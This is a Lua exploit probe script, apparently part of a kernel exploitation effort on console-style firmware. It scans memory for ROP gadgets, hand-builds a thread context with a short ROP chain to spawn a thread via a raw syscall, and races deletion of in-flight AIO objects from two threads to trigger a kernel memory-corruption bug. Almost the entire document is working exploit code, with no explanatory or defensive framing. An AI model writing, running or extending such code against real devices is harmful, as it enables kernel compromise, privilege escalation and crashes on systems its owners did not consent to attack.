-- CRASH_CLASS: HIGH
-- PROBE 941a: delete an in-flight aio object from two threads at once
--
-- 940a established the state machine: 669 submits real reads on a socketpair,
-- 664 reports state 2 while the read has no data, 662 on a state-2 object returns
-- 0x80020010 (in flight), and writing data into the peer moves it to state 3,
-- after which 662 returns 0. That is the only reachable in-flight object on this
-- firmware, and the delete body takes its lock-drop branch exactly when the
-- object is in flight and has been polled.
--
-- This probe races that: a child deletes the same ids while the parent writes the
-- data that completes them and then deletes them again.

print("=== PROBE 941a: IN-FLIGHT DELETE RACE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local base=(function()
    local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
    pcall(function() mk(593)(uint64(0),uint64(info)) end)
    return (rd(info+0x10C))*4294967296+rd(info+0x108)
end)()
local size=(function() local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
    pcall(function() mk(593)(uint64(0),uint64(info)) end) return rd(info+0x110) end)()
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
    return nil
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rdi=find_pat(string.char(0x48,0x89,0x07,0xC3))
print(string.format("[0] pid=%s base=0x%X pop_rax=0x%X store_rdi=0x%X", tostring(to_num(mk(20)())), base, pop_rax or 0, store_rdi or 0))
if not pop_rax or not store_rdi then print("[!] gadgets missing"); return end

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local PAGE=0x4000
local function spawn(sysno,a1,a2,a3)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200)
    for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+Ctx.MAGIC,0x480); wd(ctx+Ctx.TYPE,0x10000); wd(ctx+Ctx.CS,0x43); wd(ctx+Ctx.SS,0x3b)
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(store_rdi)); wq(ch+8,uint64(pop_rax)); wq(ch+16,uint64(431)); wq(ch+24,uint64(fn))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx)) end)
    return rv
end

local N=8
local function round(r)
    local sv=memory.alloc(8) wd(sv,0) wd(sv+4,0)
    local ok=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
    local fd0,fd1=rd(sv),rd(sv+4)
    if fd0<=0 then print("  no socketpair"); return false end
    local reqs=memory.alloc(0x28*N)
    local ids=memory.alloc(8*N)
    local child_ids=memory.alloc(8*N)
    local st=memory.alloc(8*N)
    local cerrs=memory.alloc(8*N)
    local perrs=memory.alloc(8*N)
    local buf=memory.alloc(0x1000*N)
    local ba=addr_of(buf)
    for i=0,0x28*N-1,4 do wd(reqs+i,0) end
    for i=0,N-1 do
        local q=reqs+i*0x28
        wd(q+0x08,0x1000)
        wd(q+0x10, (ba+i*0x1000)%4294967296) wd(q+0x14, math.floor((ba+i*0x1000)/4294967296))
        wd(q+0x20,fd0)
    end
    mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids))
    for i=0,N-1 do wd(child_ids+i*4, rd(ids+i*4)) end
    mk(664)(uint64(ids),uint64(N),uint64(st))
    local inflight=0
    for i=0,N-1 do if rd(st+i*4)==2 then inflight=inflight+1 end end
    -- race: child deletes, parent completes the reads and deletes too
    spawn(662, child_ids, N, cerrs)
    local wb=memory.alloc(0x1000*N)
    for i=0,0x1000*N-4,4 do wd(wb+i,0x41424344) end
    mk(4)(uint64(fd1),uint64(wb),uint64(0x1000*N),uint64(0))
    local rvp = mk(662)(uint64(ids),uint64(N),uint64(perrs))
    mk(240)(uint64(0),uint64(80000000))
    local cz,pz=0,0
    for i=1,N-1 do
        if rd(cerrs+i*4)==0 then cz=cz+1 end
        if rd(perrs+i*4)==0 then pz=pz+1 end
    end
    print(string.format("  [r%d] inflight=%d child_zero=%d parent_zero=%d", r, inflight, cz, pz))
    -- sanity: a fresh object must still work
    local rid=memory.alloc(8) local rst=memory.alloc(8)
    local r2=memory.alloc(0x28)
    for i=0,0x24,4 do wd(r2+i,0) end
    mk(669)(uint64(0x1001),uint64(r2),uint64(1),uint64(3),uint64(rid))
    local id2=rd(rid)
    local fresh = id2 and id2>0
    local rvs = mk(662)(uint64(rid),uint64(1),uint64(rst))
    print(string.format("        fresh id=0x%08X del=0x%08X", id2 or 0, rd(rst)))
    return fresh
end

local alive=0
for r=1,4 do
    local ok,r2=pcall(round,r)
    if not ok then print("  round error: "..tostring(r2)) break end
    mk(240)(uint64(0),uint64(50000000))
end
print("[Z] alive pid=" .. tostring(to_num(mk(20)())))
print("=== COMPLETE ===")
